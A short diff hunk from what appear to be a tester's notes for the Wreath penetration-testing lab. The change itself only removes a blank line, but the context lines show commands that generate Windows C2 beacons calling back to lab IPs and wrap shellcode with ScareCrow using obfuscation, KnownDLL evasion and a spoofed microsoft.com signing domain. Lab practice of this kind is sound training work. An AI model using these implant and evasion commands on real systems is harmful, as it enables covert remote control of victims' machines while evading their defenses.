@@ -28,7 +28,6 @@ generate beacon --http 10.200.105.200:10005 --arch amd64 --os windows --save /ho
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
 # mv to match its parent directory
 
-
 generate beacon --http 10.200.105.150:10010 --arch amd64 --os windows --save /home/kali/Wreath/PERSONAL.bin -f shellcode -G
 
 /opt/ScareCrow/ScareCrow -I /home/kali/Wreath/PERSONAL.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
